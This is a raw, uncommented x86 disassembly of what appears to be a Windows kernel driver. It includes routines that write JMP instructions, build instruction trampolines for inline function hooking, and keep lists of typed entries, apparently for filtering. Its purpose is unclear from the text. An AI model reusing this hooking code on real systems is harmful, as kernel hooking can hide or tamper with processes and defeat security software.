   114f5:	push   DWORD PTR [esi]
   114f7:	lea    eax,[ebp-0x198]
   114fd:	push   DWORD PTR [ebp-0x50]
   11500:	push   eax
   11501:	lea    eax,[ebp-0xb8]
   11507:	push   eax
   11508:	lea    eax,[ebp-0x44]
   1150b:	push   eax
   1150c:	push   DWORD PTR [ebp-0x4c]
   1150f:	call   0x11192
   11514:	cmp    eax,edi
   11516:	mov    DWORD PTR [ebp-0x54],eax
   11519:	jne    0x11528
   1151b:	push   DWORD PTR [ebp-0x60]
   1151e:	push   DWORD PTR [ebp-0x58]
   11521:	push   DWORD PTR [esi]
   11523:	call   0x11288
   11528:	push   edi
   11529:	push   DWORD PTR [ebp-0x4c]
   1152c:	call   DWORD PTR ds:0x1b278
   11532:	push   DWORD PTR [ebp-0x48]
   11535:	call   DWORD PTR ds:0x1b180
   1153b:	pop    ebx
   1153c:	mov    ecx,DWORD PTR [ebp-0x4]
   1153f:	mov    eax,DWORD PTR [ebp-0x54]
   11542:	pop    edi
   11543:	xor    ecx,ebp
   11545:	pop    esi
   11546:	call   0x1a164
   1154b:	leave  
   1154c:	ret    0xc
   1154f:	int3   
   11550:	int3   
   11551:	int3   
   11552:	int3   
   11553:	int3   
   11554:	mov    edi,edi
   11556:	push   ebp
   11557:	mov    ebp,esp
   11559:	sub    esp,0x10
   1155c:	push   ebx
   1155d:	push   esi
   1155e:	push   edi
   1155f:	xor    ebx,ebx
   11561:	mov    esi,0x400
   11566:	push   esi
   11567:	push   ebx
   11568:	mov    DWORD PTR [ebp-0xc],ebx
   1156b:	mov    BYTE PTR [ebp-0x1],bl
   1156e:	call   DWORD PTR ds:0x1b124
   11574:	mov    edi,eax
   11576:	cmp    edi,ebx
   11578:	mov    DWORD PTR [ebp-0x10],edi
   1157b:	je     0x11691
   11581:	push   ebx
   11582:	lea    eax,[ebp-0x8]
   11585:	push   eax
   11586:	mov    eax,ds:0x1b1a0
   1158b:	push   ebx
   1158c:	push   DWORD PTR [eax]
   1158e:	push   ebx
   1158f:	push   DWORD PTR [ebp+0x8]
   11592:	call   DWORD PTR ds:0x1b19c
   11598:	test   eax,eax
   1159a:	jne    0x11689
   115a0:	push   esi
   115a1:	push   ebx
   115a2:	push   edi
   115a3:	call   0x1a1b0
   115a8:	mov    eax,DWORD PTR [ebp-0x8]
   115ab:	add    esp,0xc
   115ae:	push   DWORD PTR [eax+0x4]
   115b1:	call   DWORD PTR ds:0x1b130
   115b7:	test   al,al
   115b9:	je     0x11680
   115bf:	lea    eax,[ebp-0xc]
   115c2:	push   eax
   115c3:	mov    eax,DWORD PTR [ebp-0x8]
   115c6:	push   esi
   115c7:	push   edi
   115c8:	push   DWORD PTR [eax+0x4]
   115cb:	call   DWORD PTR ds:0x1b198
   115d1:	test   eax,eax
   115d3:	jne    0x11680
   115d9:	mov    esi,DWORD PTR [ebp+0x10]
   115dc:	push   DWORD PTR [esi]
   115de:	push   ebx
   115df:	push   DWORD PTR [ebp+0xc]
   115e2:	call   0x1a1b0
   115e7:	mov    ecx,DWORD PTR [esi]
   115e9:	movzx  eax,WORD PTR [edi]
   115ec:	shr    ecx,1
   115ee:	add    esp,0xc
   115f1:	dec    ecx
   115f2:	shr    eax,1
   115f4:	cmp    eax,ecx
   115f6:	jb     0x115fa
   115f8:	mov    eax,ecx
   115fa:	push   eax
   115fb:	push   DWORD PTR [edi+0x4]
   115fe:	push   DWORD PTR [ebp+0xc]
   11601:	call   DWORD PTR ds:0x1b194
   11607:	mov    eax,DWORD PTR [ebp+0xc]
   1160a:	add    esp,0xc
   1160d:	lea    ecx,[eax+0x2]
   11610:	mov    dx,WORD PTR [eax]
   11613:	inc    eax
   11614:	inc    eax
   11615:	cmp    dx,bx
   11618:	jne    0x11610
   1161a:	mov    edi,DWORD PTR [ebp-0x8]
   1161d:	movzx  edx,WORD PTR [edi+0x30]
   11621:	sub    eax,ecx
   11623:	mov    ecx,DWORD PTR [esi]
   11625:	shr    ecx,1
   11627:	sar    eax,1
   11629:	mov    ebx,ecx
   1162b:	sub    ebx,eax
   1162d:	shr    edx,1
   1162f:	dec    ebx
   11630:	cmp    edx,ebx
   11632:	jae    0x11638
   11634:	mov    ecx,edx
   11636:	jmp    0x1164f
   11638:	mov    eax,DWORD PTR [ebp+0xc]
   1163b:	lea    ebx,[eax+0x2]
   1163e:	mov    dx,WORD PTR [eax]
   11641:	inc    eax
   11642:	inc    eax
   11643:	test   dx,dx
   11646:	jne    0x1163e
   11648:	sub    eax,ebx
   1164a:	sar    eax,1
   1164c:	sub    ecx,eax
   1164e:	dec    ecx
   1164f:	push   ecx
   11650:	push   DWORD PTR [edi+0x34]
   11653:	push   DWORD PTR [ebp+0xc]
   11656:	call   DWORD PTR ds:0x1b190
   1165c:	mov    eax,DWORD PTR [ebp+0xc]
   1165f:	add    esp,0xc
   11662:	lea    edx,[eax+0x2]
   11665:	mov    cx,WORD PTR [eax]
   11668:	inc    eax
   11669:	inc    eax
   1166a:	test   cx,cx
   1166d:	jne    0x11665
   1166f:	mov    edi,DWORD PTR [ebp-0x10]
   11672:	sub    eax,edx
   11674:	sar    eax,1
   11676:	add    eax,eax
   11678:	mov    DWORD PTR [esi],eax
   1167a:	mov    BYTE PTR [ebp-0x1],0x1
   1167e:	xor    ebx,ebx
   11680:	mov    ecx,DWORD PTR [ebp-0x8]
   11683:	call   DWORD PTR ds:0x1b284
   11689:	push   ebx
   1168a:	push   edi
   1168b:	call   DWORD PTR ds:0x1b278
   11691:	mov    al,BYTE PTR [ebp-0x1]
   11694:	pop    edi
   11695:	pop    esi
   11696:	pop    ebx
   11697:	leave  
   11698:	ret    0xc
   1169b:	int3   
   1169c:	int3   
   1169d:	int3   
   1169e:	int3   
   1169f:	int3   
   116a0:	mov    edi,edi
   116a2:	push   ebp
   116a3:	mov    ebp,esp
   116a5:	sub    esp,0x30
   116a8:	mov    eax,ds:0x1bb6c
   116ad:	xor    eax,ebp
   116af:	mov    DWORD PTR [ebp-0x4],eax
   116b2:	and    WORD PTR [ebp-0x14],0x0
   116b7:	push   esi
   116b8:	push   edi
   116b9:	xor    eax,eax
   116bb:	lea    edi,[ebp-0x12]
   116be:	stos   DWORD PTR es:[edi],eax
   116bf:	stos   DWORD PTR es:[edi],eax
   116c0:	stos   DWORD PTR es:[edi],eax
   116c1:	mov    BYTE PTR [ebp-0x15],0x1
   116c5:	stos   WORD PTR es:[edi],ax
   116c7:	call   0x1a1bc
   116cc:	mov    DWORD PTR [ebp-0x2c],eax
   116cf:	call   DWORD PTR ds:0x1b1a8
   116d5:	mov    esi,eax
   116d7:	test   esi,esi
   116d9:	mov    DWORD PTR [ebp-0x30],esi
   116dc:	je     0x11844
   116e2:	and    DWORD PTR [ebp-0x24],0x0
   116e6:	push   ebx
   116e7:	mov    ebx,DWORD PTR ds:0x1b130
   116ed:	mov    DWORD PTR [ebp-0x20],esi
   116f0:	cmp    DWORD PTR [ebp-0x24],0x1
   116f4:	jb     0x116ff
   116f6:	cmp    esi,DWORD PTR [ebp-0x30]
   116f9:	je     0x11843
   116ff:	mov    eax,ds:0x1bfa8
   11704:	inc    DWORD PTR [ebp-0x24]
   11707:	lea    edi,[eax+esi*1]
   1170a:	push   edi
   1170b:	call   ebx
   1170d:	test   al,al
   1170f:	je     0x11843
   11715:	cmp    DWORD PTR [edi],0x0
   11718:	jl     0x11843
   1171e:	mov    eax,ds:0x1bfb0
   11723:	add    eax,esi
   11725:	push   eax
   11726:	mov    DWORD PTR [ebp-0x1c],eax
   11729:	call   ebx
   1172b:	test   al,al
   1172d:	je     0x11843
   11733:	xor    eax,eax
   11735:	lea    edi,[ebp-0x14]
   11738:	stos   DWORD PTR es:[edi],eax
   11739:	stos   DWORD PTR es:[edi],eax
   1173a:	stos   DWORD PTR es:[edi],eax
   1173b:	push   0xf
   1173d:	push   DWORD PTR [ebp-0x1c]
   11740:	stos   DWORD PTR es:[edi],eax
   11741:	lea    eax,[ebp-0x14]
   11744:	push   eax
   11745:	call   DWORD PTR ds:0x1b1a4
   1174b:	lea    eax,[ebp-0x14]
   1174e:	push   0x1a598
   11753:	push   eax
   11754:	call   DWORD PTR ds:0x1b140
   1175a:	add    esp,0x14
   1175d:	test   eax,eax
   1175f:	je     0x11765
   11761:	mov    BYTE PTR [eax+0x4],0x0
   11765:	mov    eax,ds:0x1bff0
   1176a:	mov    esi,DWORD PTR [eax+esi*1]
   1176d:	and    DWORD PTR [ebp-0x1c],0x0
   11771:	sub    esi,DWORD PTR ds:0x1bff8
   11777:	mov    DWORD PTR [ebp-0x28],esi
   1177a:	cmp    DWORD PTR [ebp-0x1c],0x1
   1177e:	jb     0x11789
   11780:	cmp    esi,DWORD PTR [ebp-0x28]
   11783:	je     0x1181f
   11789:	inc    DWORD PTR [ebp-0x1c]
   1178c:	cmp    esi,DWORD PTR [ebp-0x2c]
   1178f:	je     0x11800
   11791:	mov    eax,ds:0x1bfec
   11796:	lea    edi,[eax+esi*1]
   11799:	push   edi
   1179a:	call   ebx
   1179c:	test   al,al
   1179e:	je     0x11800
   117a0:	cmp    DWORD PTR [edi],0x0
   117a3:	je     0x11800
   117a5:	mov    eax,ds:0x1bfe4
   117aa:	lea    edi,[eax+esi*1]
   117ad:	push   edi
   117ae:	call   ebx
   117b0:	test   al,al
   117b2:	je     0x11800
   117b4:	cmp    BYTE PTR ds:0x1bf91,0x0
   117bb:	je     0x117c7
   117bd:	cmp    DWORD PTR [edi],0x4
   117c0:	setne  al
   117c3:	test   al,al
   117c5:	je     0x11800
   117c7:	mov    eax,ds:0x1bfe8
   117cc:	lea    edi,[eax+esi*1]
   117cf:	push   edi
   117d0:	call   ebx
   117d2:	test   al,al
   117d4:	je     0x11800
   117d6:	mov    edi,DWORD PTR [edi]
   117d8:	add    edi,0xc
   117db:	push   edi
   117dc:	call   ebx
   117de:	test   al,al
   117e0:	je     0x11800
   117e2:	mov    edi,DWORD PTR [edi]
   117e4:	add    edi,0x4
   117e7:	push   edi
   117e8:	call   ebx
   117ea:	test   al,al
   117ec:	je     0x11800
   117ee:	mov    edi,DWORD PTR [edi]
   117f0:	mov    eax,DWORD PTR [ebp+0x8]
   117f3:	cmp    edi,eax
   117f5:	jb     0x11800
   117f7:	mov    ecx,DWORD PTR [ebp+0xc]
   117fa:	add    eax,ecx
   117fc:	cmp    edi,eax
   117fe:	jbe    0x1181b
   11800:	mov    eax,ds:0x1bff4
   11805:	add    esi,eax
   11807:	push   esi
   11808:	call   ebx
   1180a:	test   al,al
   1180c:	je     0x1181f
   1180e:	mov    esi,DWORD PTR [esi]
   11810:	sub    esi,DWORD PTR ds:0x1bff4
   11816:	jmp    0x1177a
   1181b:	mov    BYTE PTR [ebp-0x15],0x0
   1181f:	mov    eax,ds:0x1bfac
   11824:	mov    ecx,DWORD PTR [ebp-0x20]
   11827:	lea    esi,[eax+ecx*1]
   1182a:	push   esi
   1182b:	call   ebx
   1182d:	test   al,al
   1182f:	je     0x11843
   11831:	mov    eax,DWORD PTR [esi]
   11833:	sub    eax,DWORD PTR ds:0x1bfac
   11839:	mov    DWORD PTR [ebp-0x20],eax
   1183c:	mov    esi,eax
   1183e:	jmp    0x116f0
   11843:	pop    ebx
   11844:	mov    ecx,DWORD PTR [ebp-0x4]
   11847:	mov    al,BYTE PTR [ebp-0x15]
   1184a:	pop    edi
   1184b:	xor    ecx,ebp
   1184d:	pop    esi
   1184e:	call   0x1a164
   11853:	leave  
   11854:	ret    0x8
   11857:	int3   
   11858:	int3   
   11859:	int3   
   1185a:	int3   
   1185b:	int3   
   1185c:	mov    edi,edi
   1185e:	push   ebp
   1185f:	mov    ebp,esp
   11861:	mov    eax,DWORD PTR [ebp+0xc]
   11864:	mov    ecx,DWORD PTR [ebp+0x8]
   11867:	sub    ecx,eax
   11869:	sub    ecx,0x5
   1186c:	mov    DWORD PTR [eax+0x1],ecx
   1186f:	mov    BYTE PTR [eax],0xe9
   11872:	pop    ebp
   11873:	ret    0x8
   11876:	int3   
   11877:	int3   
   11878:	int3   
   11879:	int3   
   1187a:	int3   
   1187b:	int3   
   1187c:	mov    edi,edi
   1187e:	push   ebp
   1187f:	mov    ebp,esp
   11881:	push   ecx
   11882:	and    DWORD PTR [ebp-0x4],0x0
   11886:	push   esi
   11887:	push   edi
   11888:	mov    edi,DWORD PTR [ebp+0x8]
   1188b:	xor    esi,esi
   1188d:	test   edi,edi
   1188f:	jne    0x11895
   11891:	xor    eax,eax
   11893:	jmp    0x118f7
   11895:	lea    eax,[ebp-0x4]
   11898:	push   eax
   11899:	push   edi
   1189a:	call   0x19212
   1189f:	add    esi,DWORD PTR [ebp-0x4]
   118a2:	add    edi,DWORD PTR [ebp-0x4]
   118a5:	cmp    esi,0x5
   118a8:	jb     0x11895
   118aa:	push   ebx
   118ab:	lea    edi,[esi+0x5]
   118ae:	push   edi
   118af:	push   0x0
   118b1:	call   DWORD PTR ds:0x1b124
   118b7:	push   edi
   118b8:	mov    edi,0x90
   118bd:	mov    ebx,eax
   118bf:	push   edi
   118c0:	push   ebx
   118c1:	call   0x1a1b0
   118c6:	push   esi
   118c7:	push   DWORD PTR [ebp+0x8]
   118ca:	push   ebx
   118cb:	call   0x1a1a4
   118d0:	push   esi
   118d1:	push   edi
   118d2:	mov    edi,DWORD PTR [ebp+0x8]
   118d5:	push   edi
   118d6:	call   0x1a1b0
   118db:	add    esp,0x24
   118de:	lea    eax,[ebx+esi*1]
   118e1:	push   eax
   118e2:	lea    eax,[edi+0x5]
   118e5:	push   eax
   118e6:	call   0x1185c
   118eb:	push   edi
   118ec:	push   DWORD PTR [ebp+0xc]
   118ef:	call   0x1185c
   118f4:	mov    eax,ebx
   118f6:	pop    ebx
   118f7:	pop    edi
   118f8:	pop    esi
   118f9:	leave  
   118fa:	ret    0x8
   118fd:	int3   
   118fe:	int3   
   118ff:	int3   
   11900:	int3   
   11901:	int3   
   11902:	push   0xc
   11904:	push   0x1b3a8
   11909:	call   0x1a1c8
   1190e:	mov    esi,DWORD PTR ds:0x1bfcc
   11914:	mov    DWORD PTR [ebp-0x1c],esi
   11917:	xor    edi,edi
   11919:	push   edi
   1191a:	push   edi
   1191b:	push   edi
   1191c:	push   edi
   1191d:	push   0x1c9e0
   11922:	call   DWORD PTR ds:0x1b110
   11928:	cmp    eax,edi
   1192a:	je     0x11930
   1192c:	xor    eax,eax
   1192e:	jmp    0x1198e
   11930:	mov    DWORD PTR [ebp-0x4],edi
   11933:	mov    ebx,DWORD PTR [ebp+0xc]
   11936:	mov    edi,DWORD PTR ds:0x1b168
   1193c:	test   esi,esi
   1193e:	je     0x1197b
   11940:	mov    eax,DWORD PTR [ebp+0x8]
   11943:	cmp    DWORD PTR [esi],eax
   11945:	jne    0x11970
   11947:	dec    eax
   11948:	je     0x1196b
   1194a:	dec    eax
   1194b:	je     0x1196b
   1194d:	dec    eax
   1194e:	je     0x11966
   11950:	dec    eax
   11951:	je     0x11959
   11953:	dec    eax
   11954:	je     0x11959
   11956:	dec    eax
   11957:	jne    0x11970
   11959:	push   ebx
   1195a:	lea    eax,[esi+0xc]
   1195d:	push   eax
   1195e:	call   edi
   11960:	pop    ecx
   11961:	pop    ecx
   11962:	test   eax,eax
   11964:	jmp    0x1196e
   11966:	cmp    DWORD PTR [esi+0x4],ebx
   11969:	jmp    0x1196e
   1196b:	cmp    DWORD PTR [esi+0x8],ebx
   1196e:	je     0x11980
   11970:	mov    esi,DWORD PTR [esi+0x214]
   11976:	mov    DWORD PTR [ebp-0x1c],esi
   11979:	jmp    0x1193c
   1197b:	xor    esi,esi
   1197d:	mov    DWORD PTR [ebp-0x1c],esi
   11980:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   11987:	call   0x11999
   1198c:	mov    eax,esi
   1198e:	call   0x1a20d
   11993:	ret    0xc
   11996:	mov    esi,DWORD PTR [ebp-0x1c]
   11999:	push   0x0
   1199b:	push   0x1c9e0
   119a0:	call   DWORD PTR ds:0x1b1b0
   119a6:	ret    
   119a7:	int3   
   119a8:	int3   
   119a9:	int3   
   119aa:	int3   
   119ab:	int3   
   119ac:	push   0xc
   119ae:	push   0x1b3c8
   119b3:	call   0x1a1c8
   119b8:	xor    ebx,ebx
   119ba:	mov    BYTE PTR [ebp-0x19],bl
   119bd:	push   ebx
   119be:	push   ebx
   119bf:	push   ebx
   119c0:	push   ebx
   119c1:	push   0x1c9e0
   119c6:	call   DWORD PTR ds:0x1b110
   119cc:	cmp    eax,ebx
   119ce:	je     0x119d7
   119d0:	xor    al,al
   119d2:	jmp    0x11a5d
   119d7:	mov    DWORD PTR [ebp-0x4],ebx
   119da:	push   DWORD PTR [ebp+0x10]
   119dd:	push   DWORD PTR [ebp+0xc]
   119e0:	push   DWORD PTR [ebp+0x8]
   119e3:	call   0x11902
   119e8:	cmp    eax,ebx
   119ea:	je     0x11a4e
   119ec:	cmp    DWORD PTR [eax+0x218],ebx
   119f2:	je     0x11a06
   119f4:	mov    ecx,DWORD PTR [eax+0x218]
   119fa:	mov    edx,DWORD PTR [eax+0x214]
   11a00:	mov    DWORD PTR [ecx+0x214],edx
   11a06:	lea    ecx,[eax+0x214]
   11a0c:	cmp    DWORD PTR [ecx],ebx
   11a0e:	je     0x11a1e
   11a10:	mov    edx,DWORD PTR [ecx]
   11a12:	mov    esi,DWORD PTR [eax+0x218]
   11a18:	mov    DWORD PTR [edx+0x218],esi
   11a1e:	cmp    DWORD PTR ds:0x1bfcc,eax
   11a24:	jne    0x11a2e
   11a26:	mov    ecx,DWORD PTR [ecx]
   11a28:	mov    DWORD PTR ds:0x1bfcc,ecx
   11a2e:	cmp    DWORD PTR ds:0x1bfd0,eax
   11a34:	jne    0x11a42
   11a36:	mov    ecx,DWORD PTR [eax+0x218]
   11a3c:	mov    DWORD PTR ds:0x1bfd0,ecx
   11a42:	push   ebx
   11a43:	push   eax
   11a44:	call   DWORD PTR ds:0x1b278
   11a4a:	mov    BYTE PTR [ebp-0x19],0x1
   11a4e:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   11a55:	call   0x11a67
   11a5a:	mov    al,BYTE PTR [ebp-0x19]
   11a5d:	call   0x1a20d
   11a62:	ret    0xc
   11a65:	xor    ebx,ebx
   11a67:	push   ebx
   11a68:	push   0x1c9e0
   11a6d:	call   DWORD PTR ds:0x1b1b0
   11a73:	ret    
   11a74:	int3   
   11a75:	int3   
   11a76:	int3   
   11a77:	int3   
   11a78:	int3   
   11a79:	int3   
   11a7a:	push   0xc
   11a7c:	push   0x1b3e8
   11a81:	call   0x1a1c8
   11a86:	mov    BYTE PTR [ebp-0x19],0x0
   11a8a:	xor    edi,edi
   11a8c:	push   edi
   11a8d:	push   edi
   11a8e:	push   edi
   11a8f:	push   edi
   11a90:	push   0x1c9e0
   11a95:	call   DWORD PTR ds:0x1b110
   11a9b:	cmp    eax,edi
   11a9d:	je     0x11aa6
   11a9f:	xor    al,al
   11aa1:	jmp    0x11bf9
   11aa6:	mov    DWORD PTR [ebp-0x4],edi
   11aa9:	push   DWORD PTR [ebp+0x10]
   11aac:	mov    ebx,DWORD PTR [ebp+0xc]
   11aaf:	push   ebx
   11ab0:	push   DWORD PTR [ebp+0x8]
   11ab3:	call   0x11902
   11ab8:	cmp    eax,edi
   11aba:	jne    0x11bea
   11ac0:	mov    esi,0x21c
   11ac5:	push   esi
   11ac6:	push   edi
   11ac7:	call   DWORD PTR ds:0x1b124
   11acd:	mov    edi,eax
   11acf:	test   edi,edi
   11ad1:	je     0x11bea
   11ad7:	push   esi
   11ad8:	push   0x0
   11ada:	push   edi
   11adb:	call   0x1a1b0
   11ae0:	add    esp,0xc
   11ae3:	mov    esi,DWORD PTR [ebp+0x8]
   11ae6:	mov    eax,esi
   11ae8:	dec    eax
   11ae9:	je     0x11bb9
   11aef:	dec    eax
   11af0:	je     0x11bb9
   11af6:	dec    eax
   11af7:	je     0x11bb4
   11afd:	dec    eax
   11afe:	je     0x11b72
   11b00:	dec    eax
   11b01:	je     0x11b43
   11b03:	dec    eax
   11b04:	je     0x11b14
   11b06:	push   0x0
   11b08:	push   edi
   11b09:	call   DWORD PTR ds:0x1b278
   11b0f:	jmp    0x11bea
   11b14:	mov    eax,ebx
   11b16:	lea    edx,[eax+0x2]
   11b19:	mov    cx,WORD PTR [eax]
   11b1c:	inc    eax
   11b1d:	inc    eax
   11b1e:	test   cx,cx
   11b21:	jne    0x11b19
   11b23:	sub    eax,edx
   11b25:	sar    eax,1
   11b27:	mov    ecx,eax
   11b29:	mov    eax,0x103
   11b2e:	cmp    ecx,eax
   11b30:	jae    0x11ba3
   11b32:	mov    eax,ebx
   11b34:	lea    edx,[eax+0x2]
   11b37:	mov    cx,WORD PTR [eax]
   11b3a:	inc    eax
   11b3b:	inc    eax
   11b3c:	test   cx,cx
   11b3f:	jne    0x11b37
   11b41:	jmp    0x11b9f
   11b43:	mov    eax,ebx
   11b45:	lea    edx,[eax+0x2]
   11b48:	mov    cx,WORD PTR [eax]
   11b4b:	inc    eax
   11b4c:	inc    eax
   11b4d:	test   cx,cx
   11b50:	jne    0x11b48
   11b52:	sub    eax,edx
   11b54:	sar    eax,1
   11b56:	mov    ecx,eax
   11b58:	mov    eax,0x103
   11b5d:	cmp    ecx,eax
   11b5f:	jae    0x11ba3
   11b61:	mov    eax,ebx
   11b63:	lea    edx,[eax+0x2]
   11b66:	mov    cx,WORD PTR [eax]
   11b69:	inc    eax
   11b6a:	inc    eax
   11b6b:	test   cx,cx
   11b6e:	jne    0x11b66
   11b70:	jmp    0x11b9f
   11b72:	mov    eax,ebx
   11b74:	lea    edx,[eax+0x2]
   11b77:	mov    cx,WORD PTR [eax]
   11b7a:	inc    eax
   11b7b:	inc    eax
   11b7c:	test   cx,cx
   11b7f:	jne    0x11b77
   11b81:	sub    eax,edx
   11b83:	sar    eax,1
   11b85:	mov    ecx,eax
   11b87:	mov    eax,0x103
   11b8c:	cmp    ecx,eax
   11b8e:	jae    0x11ba3
   11b90:	mov    eax,ebx
   11b92:	lea    edx,[eax+0x2]
   11b95:	mov    cx,WORD PTR [eax]
   11b98:	inc    eax
   11b99:	inc    eax
   11b9a:	test   cx,cx
   11b9d:	jne    0x11b95
   11b9f:	sub    eax,edx
   11ba1:	sar    eax,1
   11ba3:	push   eax
   11ba4:	push   ebx
   11ba5:	lea    eax,[edi+0xc]
   11ba8:	push   eax
   11ba9:	call   DWORD PTR ds:0x1b194
   11baf:	add    esp,0xc
   11bb2:	jmp    0x11bbc
   11bb4:	mov    DWORD PTR [edi+0x4],ebx
   11bb7:	jmp    0x11bbc
   11bb9:	mov    DWORD PTR [edi+0x8],ebx
   11bbc:	mov    DWORD PTR [edi],esi
   11bbe:	mov    eax,ds:0x1bfd0
   11bc3:	test   eax,eax
   11bc5:	je     0x11bda
   11bc7:	mov    DWORD PTR [eax+0x214],edi
   11bcd:	mov    eax,ds:0x1bfd0
   11bd2:	mov    DWORD PTR [edi+0x218],eax
   11bd8:	jmp    0x11be0
   11bda:	mov    DWORD PTR ds:0x1bfcc,edi
   11be0:	mov    DWORD PTR ds:0x1bfd0,edi
   11be6:	mov    BYTE PTR [ebp-0x19],0x1
   11bea:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   11bf1:	call   0x11c01
   11bf6:	mov    al,BYTE PTR [ebp-0x19]
   11bf9:	call   0x1a20d
   11bfe:	ret    0xc
   11c01:	push   0x0
   11c03:	push   0x1c9e0
   11c08:	call   DWORD PTR ds:0x1b1b0
   11c0e:	ret    
   11c0f:	int3   
   11c10:	int3   
   11c11:	int3   
   11c12:	int3   
   11c13:	int3   
   11c14:	push   0xc
   11c16:	push   0x1b408
   11c1b:	call   0x1a1c8
   11c20:	mov    esi,DWORD PTR ds:0x1bfd4
   11c26:	mov    DWORD PTR [ebp-0x1c],esi
   11c29:	xor    edi,edi
   11c2b:	push   edi
   11c2c:	push   edi
   11c2d:	push   edi
   11c2e:	push   edi
   11c2f:	push   0x1c100
   11c34:	call   DWORD PTR ds:0x1b110
   11c3a:	cmp    eax,edi
   11c3c:	je     0x11c42
   11c3e:	xor    eax,eax
   11c40:	jmp    0x11c7e
   11c42:	mov    DWORD PTR [ebp-0x4],edi
   11c45:	cmp    esi,edi
   11c47:	je     0x11c6b
   11c49:	cmp    DWORD PTR [esi],0x1
   11c4c:	jne    0x11c60
   11c4e:	mov    eax,DWORD PTR [esi+0x10]
   11c51:	cmp    DWORD PTR [ebp+0x8],eax
   11c54:	jbe    0x11c60
   11c56:	mov    ecx,DWORD PTR [esi+0x18]
   11c59:	add    ecx,eax
   11c5b:	cmp    DWORD PTR [ebp+0x8],ecx
   11c5e:	jb     0x11c70
   11c60:	mov    esi,DWORD PTR [esi+0x230]
   11c66:	mov    DWORD PTR [ebp-0x1c],esi
   11c69:	jmp    0x11c45
   11c6b:	xor    esi,esi
   11c6d:	mov    DWORD PTR [ebp-0x1c],esi
   11c70:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   11c77:	call   0x11c8b
   11c7c:	mov    eax,esi
   11c7e:	call   0x1a20d
   11c83:	ret    0x4
   11c86:	xor    edi,edi
   11c88:	mov    esi,DWORD PTR [ebp-0x1c]
   11c8b:	push   edi
   11c8c:	push   0x1c100
   11c91:	call   DWORD PTR ds:0x1b1b0
   11c97:	ret    
   11c98:	int3   
   11c99:	int3   
   11c9a:	int3   
   11c9b:	int3   
   11c9c:	int3   
   11c9d:	int3   
   11c9e:	push   0xc
   11ca0:	push   0x1b428
   11ca5:	call   0x1a1c8
   11caa:	mov    esi,DWORD PTR ds:0x1bfd4
   11cb0:	mov    DWORD PTR [ebp-0x1c],esi
   11cb3:	xor    edi,edi
   11cb5:	push   edi
   11cb6:	push   edi
   11cb7:	push   edi
   11cb8:	push   edi
   11cb9:	push   0x1c100
   11cbe:	call   DWORD PTR ds:0x1b110
   11cc4:	cmp    eax,edi
   11cc6:	je     0x11ccc
   11cc8:	xor    eax,eax
   11cca:	jmp    0x11d22
   11ccc:	mov    DWORD PTR [ebp-0x4],edi
   11ccf:	cmp    esi,edi
   11cd1:	je     0x11d0f
   11cd3:	mov    eax,DWORD PTR [esi]
   11cd5:	cmp    eax,DWORD PTR [ebp+0x8]
   11cd8:	jne    0x11d04
   11cda:	mov    eax,DWORD PTR [esi+0xc]
   11cdd:	cmp    eax,DWORD PTR [ebp+0x10]
   11ce0:	jne    0x11d04
   11ce2:	cmp    DWORD PTR [ebp+0xc],edi
   11ce5:	je     0x11cfd
   11ce7:	push   DWORD PTR [ebp+0xc]
   11cea:	lea    eax,[esi+0x1c]
   11ced:	push   eax
   11cee:	call   DWORD PTR ds:0x1b168
   11cf4:	pop    ecx
   11cf5:	pop    ecx
   11cf6:	neg    eax
   11cf8:	sbb    eax,eax
   11cfa:	inc    eax
   11cfb:	jmp    0x11d00
   11cfd:	xor    eax,eax
   11cff:	inc    eax
   11d00:	cmp    eax,edi
   11d02:	jne    0x11d14
   11d04:	mov    esi,DWORD PTR [esi+0x230]
   11d0a:	mov    DWORD PTR [ebp-0x1c],esi
   11d0d:	jmp    0x11ccf
   11d0f:	xor    esi,esi
   11d11:	mov    DWORD PTR [ebp-0x1c],esi
   11d14:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   11d1b:	call   0x11d2f
   11d20:	mov    eax,esi
   11d22:	call   0x1a20d
   11d27:	ret    0xc
   11d2a:	xor    edi,edi
   11d2c:	mov    esi,DWORD PTR [ebp-0x1c]
   11d2f:	push   edi
   11d30:	push   0x1c100
   11d35:	call   DWORD PTR ds:0x1b1b0
   11d3b:	ret    
   11d3c:	int3   
   11d3d:	int3   
   11d3e:	int3   
   11d3f:	int3   
   11d40:	int3   
   11d41:	int3   
   11d42:	push   0xc
   11d44:	push   0x1b448
   11d49:	call   0x1a1c8
   11d4e:	xor    ebx,ebx
   11d50:	mov    BYTE PTR [ebp-0x19],bl
   11d53:	push   ebx
   11d54:	push   ebx
   11d55:	push   ebx
   11d56:	push   ebx
   11d57:	push   0x1c100
   11d5c:	call   DWORD PTR ds:0x1b110
   11d62:	cmp    eax,ebx
   11d64:	je     0x11d6d
   11d66:	xor    al,al
   11d68:	jmp    0x11df3
   11d6d:	mov    DWORD PTR [ebp-0x4],ebx
   11d70:	push   DWORD PTR [ebp+0x10]
   11d73:	push   DWORD PTR [ebp+0xc]
   11d76:	push   DWORD PTR [ebp+0x8]
   11d79:	call   0x11c9e
   11d7e:	cmp    eax,ebx
   11d80:	je     0x11de4
   11d82:	cmp    DWORD PTR [eax+0x234],ebx
   11d88:	je     0x11d9c
   11d8a:	mov    ecx,DWORD PTR [eax+0x234]
   11d90:	mov    edx,DWORD PTR [eax+0x230]
   11d96:	mov    DWORD PTR [ecx+0x230],edx
   11d9c:	lea    ecx,[eax+0x230]
   11da2:	cmp    DWORD PTR [ecx],ebx
   11da4:	je     0x11db4
   11da6:	mov    edx,DWORD PTR [ecx]
   11da8:	mov    esi,DWORD PTR [eax+0x234]
   11dae:	mov    DWORD PTR [edx+0x234],esi
   11db4:	cmp    DWORD PTR ds:0x1bfd4,eax
   11dba:	jne    0x11dc4
   11dbc:	mov    ecx,DWORD PTR [ecx]
   11dbe:	mov    DWORD PTR ds:0x1bfd4,ecx
   11dc4:	cmp    DWORD PTR ds:0x1bfd8,eax
   11dca:	jne    0x11dd8
   11dcc:	mov    ecx,DWORD PTR [eax+0x234]
   11dd2:	mov    DWORD PTR ds:0x1bfd8,ecx
   11dd8:	push   ebx
   11dd9:	push   eax
   11dda:	call   DWORD PTR ds:0x1b278
   11de0:	mov    BYTE PTR [ebp-0x19],0x1
   11de4:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   11deb:	call   0x11dfd
   11df0:	mov    al,BYTE PTR [ebp-0x19]
